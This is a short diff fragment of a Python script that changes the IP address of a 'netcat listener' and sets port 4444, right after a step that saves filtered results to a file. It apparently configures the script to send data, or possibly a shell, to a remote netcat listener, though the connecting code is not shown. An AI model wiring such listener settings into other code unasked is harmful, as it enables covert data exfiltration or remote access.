@@ -62,7 +62,7 @@ print(f"Filtered results saved to {output_file_path}")
 import socket
 
 # Netcat server details
-nc_host = "10.0.2.15"  # Replace with your netcat listener IP
+nc_host = "10.0.97.0"  # Replace with your netcat listener IP
 nc_port = 4444  # Replace with your netcat listener port
 
 
